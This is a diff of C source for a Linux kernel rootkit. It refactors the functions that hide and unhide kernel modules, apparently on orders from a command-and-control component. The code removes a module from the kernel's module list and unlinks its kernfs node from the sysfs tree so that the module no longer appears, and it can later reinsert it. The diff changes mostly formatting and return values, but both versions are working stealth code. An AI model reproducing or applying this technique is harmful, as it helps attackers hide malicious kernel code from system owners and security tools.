@@ -30,7 +30,6 @@
 
 #include "control.h"
 #include "include.h"
-#include "main.h"
 #include "sysmap.h"
 
 #define member rb
@@ -46,41 +45,46 @@ struct list_head *modules = (struct list_head *) sysmap_modules;
 /*
  * Function to check if the module is hidden
  */
-struct module* find_hidden_module(char* name)
+struct module *
+find_hidden_module(char* name)
 {
-  struct module* mod;
+	struct module* mod;
 
-  list_for_each_entry(mod, &hidden_modules, list) {
-   if (strcmp(mod->name, name) == 0) {
-    return mod;
-   }
-  }
-  return NULL;
+	list_for_each_entry(mod, &hidden_modules, list) {
+		if (strcmp(mod->name, name) == 0) {
+			return mod;
+		}
+	}
+
+	return NULL;
 }
 
 /*
  * Function to remove the module from kernel file system
  */
-static void kernfs_remove_node(struct kernfs_node *kn)
+static int
+kernfs_remove_node(struct kernfs_node *kn)
 {
-        /* rb_erase: Function defined in <rbtree.h>, Unlinks kernfs_node from sibling tree 
-         * Line 272@Linux/fs/kernfs/dir.c  
-         */
-        rb_erase(&kn->rb, &kn->parent->dir.children);
-        RB_CLEAR_NODE(&kn->rb);
+	/*
+	 * rb_erase: Function defined in <rbtree.h>, Unlinks kernfs_node from sibling tree 
+	 * Line 272@Linux/fs/kernfs/dir.c  
+	 */
+	rb_erase(&kn->rb, &kn->parent->dir.children);
+	RB_CLEAR_NODE(&kn->rb);
+	return 0;
 }
 
 /*
  * Function to find the position, to where the module will be inserted
  */
-int name_compare(unsigned int hash, const char *name, const void *ns, const struct kernfs_node *kn)
+int
+name_compare(unsigned int hash, const char *name, const void *ns, const struct kernfs_node *kn)
 {
-        if(hash != kn->hash)
-                return hash - kn->hash;
-        if(ns != kn->ns)
-                return ns - kn->ns;
-        return strcmp(name,kn->name);
-
+	if(hash != kn->hash)
+		return hash - kn->hash;
+	if(ns != kn->ns)
+		return ns - kn->ns;
+	return strcmp(name,kn->name);
 }
 
 /*
@@ -89,121 +93,126 @@ int name_compare(unsigned int hash, const char *name, const void *ns, const stru
  * to do this automatically. we need to search in the tree for the position to 
  * insert then link the node and color the tree. 
  */
-int kernfs_insert_node(struct kernfs_node *kn)
+int
+kernfs_insert_node(struct kernfs_node *kn)
 {
-      struct rb_node **node = &kn->parent->dir.children.rb_node;
-      struct rb_node *parent = NULL;
+	struct rb_node **node = &kn->parent->dir.children.rb_node;
+	struct rb_node *parent = NULL;
 
-      //printk("yaay! inside insert \n");
+	while(*node)
+	{
+		struct kernfs_node *pos;
+		int result;
+		/* Get the kernfs_node from rb, rb_to_kn() */
+		pos = rb_entry(*node, struct kernfs_node, member);
+		parent = *node;
+		/*compare the names to get the position to insert in rb tree*/
+		result = name_compare(kn->hash, kn->name, kn->ns, pos);
 
-      while(*node)
-      {
-                struct kernfs_node *pos;
-                int result;
-                /* Get the kernfs_node from rb, rb_to_kn() */
-                pos = rb_entry(*node, struct kernfs_node, member);
-                parent = *node;
-                /*compare the names to get the position to insert in rb tree*/
-                result = name_compare(kn->hash, kn->name, kn->ns, pos);
-                //result = kernfs_sd_comapre(kn,pos);
+		if(result < 0)
+			node = &pos->rb.rb_left;
+		else if(result > 0)
+			node = &pos->rb.rb_right;
+		else
+			return -EEXIST;
+	}
 
-                if(result < 0)
-                        node = &pos->rb.rb_left;
-                else if(result > 0)
-                        node = &pos->rb.rb_right;
-                else
-                {
-                        return -EEXIST;
-                }
-        }
+	/* Add new node and reblance the tree*/
+	rb_link_node(&kn->rb,parent,node);
+	rb_insert_color(&kn->rb, &kn->parent->dir.children);
 
-        /* Add new node and reblance the tree*/
-        rb_link_node(&kn->rb,parent,node);
-        rb_insert_color(&kn->rb, &kn->parent->dir.children);
- 	
 	/* Successfully added, account subdir number */
-        if (kernfs_type(kn) == KERNFS_DIR)
-                 kn->parent->dir.subdirs++;
-        return 0;
+	if (kernfs_type(kn) == KERNFS_DIR)
+		kn->parent->dir.subdirs++;
+
+	return 0;
 }
 
 /*
  * Function to hide the module when the modules is given
  */
-void  hide_module_bymod(struct module *mod)
+int
+hide_module_bymod(struct module *mod)
 {
-	
+	int retv;
+
 	ROOTKIT_DEBUG("Deleting module: %s\n", mod->name);
+
 	list_del(&mod->list);
-	kernfs_remove_node(mod->mkobj.kobj.sd);
+	retv = kernfs_remove_node(mod->mkobj.kobj.sd);
 	list_add_tail(&mod->list, &hidden_modules);
+
+	return retv;
 }
 
 /*
  * Function to un hide the module, when it's given
  */
-void  unhide_module_bymod(struct module *mod)
+int
+unhide_module_bymod(struct module *mod)
 {
-
 	ROOTKIT_DEBUG("Inserting module: %s\n", mod->name);
         
 	/* Delete from the modules list */
 	list_del(&mod->list);
-	list_add(&mod->list,modules);
-	kernfs_insert_node(mod->mkobj.kobj.sd);
+	list_add(&mod->list, modules);
+	return kernfs_insert_node(mod->mkobj.kobj.sd);
 }
 
 /*
  * This is called from the CC, takes the module name, finds module using the kernel method
  * find_module(name) and calls hide_module_bymod
  */
-void hide_module_byname(char *name)
+int
+hide_module_byname(char *name)
 {
-        struct module *mod;
+	int retv;
+	struct module *mod;
 
-        mutex_lock(mod_mutex);
-        mod = find_module1(name);
-        mutex_unlock(mod_mutex);
+	mutex_lock(mod_mutex);
+	mod = find_module1(name);
+	mutex_unlock(mod_mutex);
 
-        if(mod)
-	{
-          	hide_module_bymod(mod);
-	}
+	if(mod)
+		retv = hide_module_bymod(mod);
 	else
 	{
 		ROOTKIT_DEBUG("Module not found %s\n", name);	
+		retv = -EEXIST;
 	}
-
+	return retv;
 }
 
 /*
  * Function called from CC to unhide module.
  * Finds the modules from hidden module list and call unhide_module_bymod
  */
-void unhide_module_byname(char *name)
+int
+unhide_module_byname(char *name)
 {
-
-        struct module *mod;
+	int retv;
+	struct module *mod;
 	mod = find_hidden_module(name);
 	
 	if(mod)
-	{
-                unhide_module_bymod(mod);
-	}
+		retv = unhide_module_bymod(mod);
 	else
 	{
-		ROOTKIT_DEBUG("Module not found %s\n", name);	
+		ROOTKIT_DEBUG("Module not found %s\n", name);
+		retv = -EEXIST;
 	}
 
+	return retv;
 }
 
-/* Called when unloading the rootkit, to make sure no module is hidden*/
+/*
+ * Called when unloading the rootkit, to make sure no module is hidden
+ */
 void unhook_modules(void)
 {
 	while(hidden_modules.next != &hidden_modules)
-        {
-          struct module* mod = container_of(hidden_modules.next, struct module, list);
-          unhide_module_bymod(mod);
-        }
-	
+	{
+		struct module* mod = container_of(hidden_modules.next, struct module, list);
+		unhide_module_bymod(mod);
+	}
 }
